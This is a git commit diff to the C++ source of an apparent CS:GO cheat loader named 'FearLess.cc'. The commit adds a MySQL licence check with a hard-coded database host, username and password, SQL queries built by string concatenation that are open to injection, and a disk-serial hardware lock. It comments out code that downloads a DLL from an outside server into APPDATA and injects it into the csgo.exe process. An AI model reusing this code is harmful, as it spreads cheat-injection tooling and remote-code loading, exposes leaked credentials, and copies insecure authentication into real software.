a770fe8b5f636ba73213d84f8f39a89fc15fe203
Windows-10-8 <48862320+Windows-10-8@users.noreply.github.com>
2021-05-15 08:16:14 +0200

    done mysql

--- main.cpp
+++ main.cpp
@@ -34,12 +34,17 @@
 #include "stdio.h"
 #include<stdio.h>
 #include <d3d9.h>
+#include <mysql.h>
 #pragma comment(lib, "d3d9.lib")
 #define DIRECTINPUT_VERSION 0x0800
 #define LOADERW 314
 #define LOADERH 268
+#include <iostream>
 #include <dinput.h>
 #include <tchar.h>
+#include <algorithm>
+#include <cctype>
+#include <functional>
 #include <dwmapi.h>
 #pragma comment(lib, "dwmapi.lib")
 #include <WinInet.h> 
@@ -49,12 +54,14 @@
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "psapi.lib")
 
+
 static char buf[17] = { 0 };
 static char pass[17] = { 0 };
 static char inv[17] = { 0 };
 static std::string key;
 static std::string passy;
 static bool testCheckbox = false;
+#include <comdef.h>  // you will need this
 
 static HANDLE GetProcessByName(const wchar_t* name)
 {
@@ -178,8 +185,30 @@ void ResetDevice()
     ImGui_ImplDX9_CreateDeviceObjects();
 }
 
+std::wstring s2ws(const std::string& s)
+{
+    int len;
+    int slength = (int)s.length() + 1;
+    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
+    wchar_t* buf = new wchar_t[len];
+    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
+    std::wstring r(buf);
+    delete[] buf;
+    return r;
+}
 POINTS m_Pos; // store user click pos
 
+const std::string currentDateTime() {
+    time_t     now = time(0);
+    struct tm  tstruct;
+    char       buf[80];
+    tstruct = *localtime(&now);
+    // Visit http://en.cppreference.com/w/cpp/chrono/c/strftime
+    // for more information about date/time format
+    strftime(buf, sizeof(buf), "%Y-%m-%d", &tstruct);
+
+    return buf;
+}
 // Win32 message handler
 extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
 LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
@@ -226,9 +255,137 @@ LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
     }
     return ::DefWindowProc(hWnd, msg, wParam, lParam);
 }
+std::string exec(const char* cmd) {
+    std::array<char, 128> buffer;
+    std::string result;
+    std::shared_ptr<FILE> pipe(_popen(cmd, "r"), _pclose);
+    if (!pipe) throw std::runtime_error("_popen() failed!");
+    while (!feof(pipe.get())) {
+        if (fgets(buffer.data(), 128, pipe.get()) != NULL)
+            result += buffer.data();
+    }
+    return result;
+
+}
+
+int Authorization(std::string name, std::string pass)
+{
+    MYSQL* conn;
+    MYSQL_ROW row;
+    MYSQL_RES *res;
+    bool rowexist;
+
+    conn = mysql_init(0);
+    conn = mysql_real_connect(conn, "bf7ea4rwjqiikn2hyr51-mysql.services.clever-cloud.com", "ubssgp2yjqh5w77z", "NlfDfQHkmxxMC1q7YHY", "bf7ea4rwjqiikn2hyr51", 20707, NULL, 0);
+    int qstate;
+
+    if (conn) {
+        puts("Successful connection to database!");
+        std::string query = "SELECT * FROM users where name='"+ name + "' and pass='" + pass + "'";
+        const char* q = query.c_str();
+        qstate = mysql_query(conn, q);
+        if (qstate == 0)
+        {
+            res = mysql_store_result(conn);
+            while (row = mysql_fetch_row(res))
+            {
+                rowexist = true;
+                if (rowexist)
+                {
+
+
+                    //std::wstring stemp = s2ws(exec("wmic path win32_physicalmedia get SerialNumber"));
+                    //LPCWSTR result = stemp.c_str();
+                    //MessageBox(0, result, L"Success", MB_OK);
+                    std::string idk = exec("wmic path win32_physicalmedia get SerialNumber");
+                    const char* hwidr = idk.c_str();
+                    bool idkidk = false;
+
+                    if (row[2] == "" || row[2] == NULL)
+                    {
+                        idkidk = true;
+                        //hwid null
+                        //MessageBox(0, L"Updating hwid...", L"Success", MB_OK);
+
+                        MYSQL* conn1;
+                        MYSQL_ROW row1;
+                        MYSQL_RES* res1;
+                        bool rowexist1;
+
+                        conn1 = mysql_init(0);
+                        conn1 = mysql_real_connect(conn1, "bf7ea4rwjqiikn2hyr51-mysql.services.clever-cloud.com", "ubssgp2yjqh5w77z", "NlfDfQHkmxxMC1q7YHY", "bf7ea4rwjqiikn2hyr51", 20707, NULL, 0);
+                        int qstate1;
+                        if (conn1)
+                        {
+                            puts("Successful connection to database!");
+                            
+                            std::string query1 = "UPDATE users SET hwid='" + idk + "' WHERE name='" + name + "' and pass='" + pass + "'";
+                            const char* q1 = query1.c_str();
+                            qstate1 = mysql_query(conn1, q1);
+                            if (qstate1 == 0)
+                            {
+                                return 1;
+                            }
+
+
+                        }
+                    }
+                    else if (row[2] == idk)
+                    {
+                        idkidk = true;
+
+                        //std::wstring stemp = s2ws(currentDateTime());
+                        //LPCWSTR result = stemp.c_str();
+                        //MessageBox(0, result, L"Success", MB_OK);
+
+
+                        //std::wstring stemp1 = s2ws(row[3]);
+                        //LPCWSTR result1 = stemp1.c_str();
+                        //MessageBox(0, result1, L"Success", MB_OK);
+                        if (currentDateTime() < row[3])
+                        {
+                            return 1;
+                        }
+                        else
+                        {
+                            return 4;
+                        }
+                    }
+                    else if(idkidk == false)
+                    {
+
+
+                        return 2;
+                            //printf("hwid correct");
+
+                    }
+                    
+                }
+                //printf("ID: %s, Name: %s, Value: %s\n", row[0], row[1], row[2]);
+            }
+        }
+        else
+        {
+            //cout << "Query failed: " << mysql_error(conn) << endl;
+        
+        }
+        if (rowexist == false)
+        {
+            printf("no key");
+            return 3;
+
+        }
+    }
+    else {
+        puts("Connection to database has failed!");
+    }
+
+}
+
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
 {
+
     
     WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, _T("FearLess.cc"), NULL };
     ::RegisterClassEx(&wc);
@@ -297,14 +454,14 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
             ImGui::SetNextWindowPos(ImVec2(0, 0));
             ImGui::SetNextWindowSize(ImVec2(LOADERW, LOADERH));
             ImGui::Begin(xorstr("FearLess.cc"), &opened, ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoSavedSettings | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoBackground); // Create a window called "Hello, world!" and append into it.
-            
-            ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(), ImVec2(LOADERW, LOADERH), ImColor(50,50,60));
+
+            ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(), ImVec2(LOADERW, LOADERH), ImColor(50, 50, 60));
             ImGui::GetWindowDrawList()->AddRect(ImVec2(), ImVec2(LOADERW, LOADERH), ImColor(188, 188, 188, 50));
             ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(7, 9), ImVec2(307, 259), ImColor(31, 31, 31));
-         //   ImGui::GetWindowDrawList()->AddRect(ImVec2(7, 9), ImVec2(307, 259), ImColor(188, 188, 188, 50));
-            ImGui::GetWindowDrawList()->AddRectFilledMultiColor(ImVec2(21, 38), ImVec2(294, 43), ImColor(78, 129, 181), ImColor(94, 175, 255), ImColor(64, 159, 255), ImColor( 64, 159, 255));
-          //  ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(21, 54), ImVec2(294, 237), ImColor(22, 22, 22));
-          //  ImGui::GetWindowDrawList()->AddRect(ImVec2(21, 54), ImVec2(294, 237), ImColor(188, 188, 188, 50));
+            //   ImGui::GetWindowDrawList()->AddRect(ImVec2(7, 9), ImVec2(307, 259), ImColor(188, 188, 188, 50));
+            ImGui::GetWindowDrawList()->AddRectFilledMultiColor(ImVec2(21, 38), ImVec2(294, 43), ImColor(78, 129, 181), ImColor(94, 175, 255), ImColor(64, 159, 255), ImColor(64, 159, 255));
+            //  ImGui::GetWindowDrawList()->AddRectFilled(ImVec2(21, 54), ImVec2(294, 237), ImColor(22, 22, 22));
+            //  ImGui::GetWindowDrawList()->AddRect(ImVec2(21, 54), ImVec2(294, 237), ImColor(188, 188, 188, 50));
 
             ImGui::SetCursorPos(ImVec2(307 / 2 - ImGui::CalcTextSize(xorstr("FearLess.cc")).x / 2, 15));
             ImGui::Text(xorstr("FearLess.cc"));
@@ -314,7 +471,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
             ImGui::SetCursorPos(ImVec2(64, 100));
             ImGui::InputText(xorstr("###Key"), buf, IM_ARRAYSIZE(buf));
             ImGui::PopItemWidth();
-            
+
 
             ImGui::SetCursorPos(ImVec2(66, 120));
             ImGui::Text(xorstr("Password"));
@@ -327,30 +484,62 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
             if (ImGui::Button(xorstr("Load"), ImVec2(177, 21))) {
                 key = buf;
                 passy = pass;
-             //   if (Authorization()) {
-                    const char* alphabet = "qwertyuiopasdfghjklzxcvbnm0123456789";
-                    HINTERNET hInternet = InternetOpen(skCrypt(L"тут ваше название"), INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
-                    if (!hInternet) { InternetCloseHandle(hInternet); return 0; }
-                    LPCWSTR query = skCrypt(L"https://sidesense.eu/");
+                ////printf(key.c_str());
+                ////printf(passy.c_str());
+                //std::wstring stemp = s2ws(key);
+                //LPCWSTR result = stemp.c_str();
+                //std::wstring stemp1 = s2ws(passy);
+                //LPCWSTR result1 = stemp1.c_str();
+                //MessageBox(0, result, L"Success", MB_OK);
+                //MessageBox(0, result1, L"Success", MB_OK);
 
-                    HINTERNET hUrl = InternetOpenUrl(hInternet, query, 0, 0, 0, 0);
-                    std::string EndFile = getenv(skCrypt("APPDATA"));
-                    EndFile += xorstr("\\");
-                    for (int i = 0; i < 12; i++)
-                    {
-                        EndFile += alphabet[abs(int(rand()) % 36)];
-                    }
-                    EndFile += xorstr(".dll");
-                    DeleteUrlCacheEntry(skCrypt(L"https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"));
-                    if (URLDownloadToFileA(0, skCrypt("https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"), EndFile.c_str(), 0, 0) != S_OK) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }      // скачиваем dll
-                    HANDLE hProc = GetProcessByName(skCrypt(L"csgo.exe"));
-                    if (!hProc || hProc == 0) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }
+                //std::wstring stemp11 = s2ws(currentDateTime());
+                //LPCWSTR result11 = stemp11.c_str();
+                //MessageBox(0, result11, L"Success", MB_OK);
 
-                    if (Inject(EndFile.c_str(), hProc)) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }
-                    InternetCloseHandle(hInternet);
-                    InternetCloseHandle(hUrl);
+
+                std::chrono::system_clock::now();
+
+
+                if (Authorization(key, passy) == 1) {
+                    //const char* alphabet = "qwertyuiopasdfghjklzxcvbnm0123456789";
+                    //HINTERNET hInternet = InternetOpen(skCrypt(L"тут ваше название"), INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
+                    //if (!hInternet) { InternetCloseHandle(hInternet); return 0; }
+                    //LPCWSTR query = skCrypt(L"https://sidesense.eu/");
+
+                    //HINTERNET hUrl = InternetOpenUrl(hInternet, query, 0, 0, 0, 0);
+                    //std::string EndFile = getenv(skCrypt("APPDATA"));
+                    //EndFile += xorstr("\\");
+                    //for (int i = 0; i < 12; i++)
+                    //{
+                    //    EndFile += alphabet[abs(int(rand()) % 36)];
+                    //}
+                    //EndFile += xorstr(".dll");
+                    //DeleteUrlCacheEntry(skCrypt(L"https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"));
+                    //if (URLDownloadToFileA(0, skCrypt("https://HxInbgoiduGIngo:Jfgnbdiwhgonedhg@sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"), EndFile.c_str(), 0, 0) != S_OK) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }      // скачиваем dll
+                    //HANDLE hProc = GetProcessByName(skCrypt(L"csgo.exe"));
+                    //if (!hProc || hProc == 0) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }
+
+                    //if (Inject(EndFile.c_str(), hProc)) { InternetCloseHandle(hInternet); InternetCloseHandle(hUrl); return 0; }
+                    //InternetCloseHandle(hInternet);
+                    //InternetCloseHandle(hUrl);
                     MessageBox(0, L"Cheat Injected!", L"Success", MB_OK);
-      //          }
+                }
+                else if (Authorization(key, passy) == 2)
+                {
+                    MessageBox(0, L"Hwid incorrect", L"Error", MB_ICONERROR);
+
+                }
+                else if (Authorization(key, passy) == 4)
+                {
+                    MessageBox(0, L"Expired!", L"Error", MB_ICONERROR);
+
+                }
+                else if (Authorization(key, passy) == 3)
+                {
+                    MessageBox(0, L"Key not found", L"Error", MB_ICONERROR);
+
+                }
             }
             ImGui::End();
         }
